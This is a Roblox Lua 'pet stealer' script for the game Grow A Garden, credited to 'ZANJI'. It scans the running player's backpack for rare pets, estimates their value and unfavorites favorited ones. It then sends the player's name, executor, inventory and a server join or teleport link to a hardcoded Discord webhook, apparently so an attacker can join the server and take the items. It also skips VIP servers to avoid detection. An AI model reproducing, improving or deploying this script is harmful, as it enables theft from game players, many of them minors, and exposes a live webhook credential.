-- GAG Stealer Script - Optimized Version
_G.scriptExecuted = false

-- Configuration
_G.Usernames = {"ronzz2002"}
_G.min_value = 100000
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1400343593864138752/oM6rYVPa7EYfI9hsNnWBx5UrYjsTQi38YJotcg0HDt_XH8RpCeCdRGMTZyxI1npZrkEI"

-- Variables
local users = _G.Usernames
local min_value = _G.min_value
local ping = _G.pingEveryone
local webhook = _G.webhook

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Player setup
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")

-- Game modules
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")

-- Load modules
local calcPlantValue, petUtils, petRegistry, numberUtil, dataService

local success = pcall(function()
    calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
    petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
    petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
    numberUtil = require(modules:WaitForChild("NumberUtil"))
    dataService = require(modules:WaitForChild("DataService"))
end)

if not success then
    warn("Failed to load modules")
    return
end

-- Constants
local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Queen Bee", "T-Rex", "Fennec Fox", "Butterfly", "Disco Bee", "Mimic Octopus", "Kitsune", "Spinosaurus"}
local mutationKeywords = {"Ascended", "Inverted", "Rainbow", "Radiant", "IronSkin", "Golden", "Tiny", "Frozen", "Windy", "Mega", "Shiny", "Shocked"}

-- Emoji map
local petEmojis = {
    ["Fennec Fox"] = "🦊", ["Butterfly"] = "🦋", ["Dragonfly"] = "🐉", ["Red Fox"] = "🦊",
    ["Raccoon"] = "🦝", ["Queen Bee"] = "🐝", ["T-Rex"] = "🦖", ["Disco Bee"] = "🪩",
    ["Mimic Octopus"] = "🐙", ["Kitsune"] = "🦊", ["Spinosaurus"] = "🦖"
}

local function getPetEmoji(petName, weight)
    if weight >= 25 then return "💪" end
    
    local baseName = petName
    for _, mutation in ipairs(mutationKeywords) do
        baseName = baseName:gsub(mutation .. " ", ""):gsub(mutation, "")
    end
    baseName = baseName:match("^%s*(.-)%s*$")
    
    if petEmojis[baseName] then return petEmojis[baseName] end
    
    for petType, emoji in pairs(petEmojis) do
        if string.find(baseName, petType, 1, true) then return emoji end
    end
    
    return "🦊"
end

local function isRarePet(petName, weight)
    for _, rare in ipairs(rarePets) do
        if string.find(petName, rare, 1, true) then return true end
    end
    return weight and weight >= 25
end

local function hasMutation(petName)
    for _, mutation in ipairs(mutationKeywords) do
        if string.find(petName, mutation) then return true end
    end
    return false
end

local totalValue = 0
local itemsToSend = {}

-- Validation
if not users[1] or webhook == "" then return end
if game.PlaceId ~= 126884695634066 then return end

local serverTypeSuccess, serverType = pcall(function()
    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
end)

if serverTypeSuccess and serverType == "VIPServer" then return end

-- Pet value calculation
local function calcPetValue(v14)
    if not v14 or not v14.PetData then return 0 end
    
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    
    local v17 = eggData.RarityData and eggData.RarityData.Items and eggData.RarityData.Items[v14.PetType]
    if not v17 then return 0 end
    
    local weightRange = v17.GeneratedPetData and v17.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

-- Number formatting
local function formatNumber(number)
    if not number then return "0" end
    local formatted = tostring(math.floor(number))
    local k
    while true do
        formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
        if k == 0 then break end
    end
    return formatted
end

-- Webhook sending
local function sendWebhook(data)
    if not request then return false end
    
    spawn(function()
        local success, response = pcall(function()
            local body = HttpService:JSONEncode(data)
            return request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
        
        if not success then
            warn("Failed to send webhook:", response)
        end
    end)
    
    return true
end

-- Send join message
local function SendJoinMessage(list, prefix)
    local playerName = plr.Name
    local userId = tostring(plr.UserId)
    local executor = "Unknown"
    if identifyexecutor then executor = identifyexecutor() end
    
    local totalValueStr = formatNumber(totalValue)
    local jobId = game.JobId or "N/A"
    local placeId = tostring(game.PlaceId)
    local playerCount = tostring(#Players:GetPlayers())
    local maxPlayers = tostring(Players.MaxPlayers or "?")
    local timeStr = os.date("%I:%M %p")
    local dateStr = os.date("%m/%d/%y")
    local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
    local teleportDisplay = string.format('%s | %s', placeId, jobId)
    local joinUrl = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", placeId, jobId)

    -- Pet list formatting
    local petLines = {}
    for _, item in ipairs(list) do
        if item.Type == "Pet" then
            local ageStr = ""
            if not item.HasMutation and item.Age and item.Age ~= "N/A" then
                ageStr = string.format(" [Age: %s]", tostring(item.Age))
            end
            table.insert(petLines, string.format("%s%s [%.2f KG] → %s¢", item.Name, ageStr, item.Weight, formatNumber(item.Value)))
        end
    end
    local petListStr = table.concat(petLines, "\n")

    local playerInfoSection = string.format("```Name: %s\nExecutor: %s\nAccount Age: %s days\nPlayers in game: %s/%s```", playerName, executor, "72", playerCount, maxPlayers)
    
    local description = string.format(
        ":bust_in_silhouette: **Player Information**\n%s\n💰 **Total Value:**\n```%s```\n🐕 **Pets Found:**\n```%s```\n🔗 **Game Link:** [Click to join](%s)\n\n-# %s",
        playerInfoSection,
        totalValueStr,
        petListStr,
        joinUrl,
        teleportDisplay
    )

    local data = {
        ["content"] = prefix .. teleportCmd,
        ["username"] = playerName,
        ["embeds"] = {{
            ["title"] = ":dog: Grow A Garden Hit - ZANJI: PET STEALER :dog:",
            ["color"] = 15158332,
            ["description"] = description,
            ["footer"] = {["text"] = "🐕 GAG Pet Stealer by ZANJI"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
        }}
    }

    return sendWebhook(data)
end

-- Main execution
print("Scanning backpack for pets...")

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
        local petUUID = tool:GetAttribute("PET_UUID")
        if petUUID and dataService and dataService.GetData then
            local playerData = dataService:GetData()
            if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                local v14 = playerData.PetsData.PetInventory.Data[petUUID]
                if v14 then
                    local toolName = tool.Name
                    local itemName = toolName:match("^(.-) %[%d+%.?%d* KG%]") or toolName
                    
                    local weight = 0
                    if v14.PetData and v14.PetData.BaseWeight then
                        weight = tonumber(v14.PetData.BaseWeight) or 0
                    end
                    
                    if weight == 0 then
                        weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                    end
                    
                    if weight == 0 then
                        local weightAttr = tool:GetAttribute("Weight") or tool:GetAttribute("KG") or tool:GetAttribute("WeightValue")
                        if weightAttr then weight = tonumber(weightAttr) or 0 end
                    end
                    
                    local petAge = nil
                    if v14.PetData and v14.PetData.Age then
                        petAge = tonumber(v14.PetData.Age)
                    end
                    
                    if not petAge then
                        petAge = toolName:match("%[Age[:%s]*(%d+)%]") or
                                toolName:match("Age[:%s]*(%d+)") or
                                toolName:match("(%d+)%s*Age") or
                                toolName:match("Age%s*(%d+)")
                        
                        if petAge then
                            petAge = tonumber(petAge)
                        else
                            petAge = "N/A"
                        end
                    end
                    
                    if isRarePet(itemName, weight) then
                        if tool:GetAttribute("Favorite") then
                            pcall(function()
                                replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                            end)
                        end
                        
                        local value = calcPetValue(v14)
                        totalValue = totalValue + value
                        
                        local petEmoji = getPetEmoji(itemName, weight)
                        local hasPetMutation = hasMutation(itemName)
                        local displayName = petEmoji .. " - " .. itemName
                        
                        table.insert(itemsToSend, {
                            Tool = tool, 
                            Name = displayName, 
                            Value = value, 
                            Weight = weight, 
                            Type = "Pet", 
                            Age = petAge, 
                            HasMutation = hasPetMutation
                        })
                    end
                end
            end
        end
    end
end

print("Total items found:", #itemsToSend)
print("Total value:", totalValue)

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
        else return a.Value > b.Value end
    end)

    local prefix = ping == "Yes" and "--@everyone " or ""
    SendJoinMessage(itemsToSend, prefix)
else
    print("No items found that meet the minimum value requirement")
end 
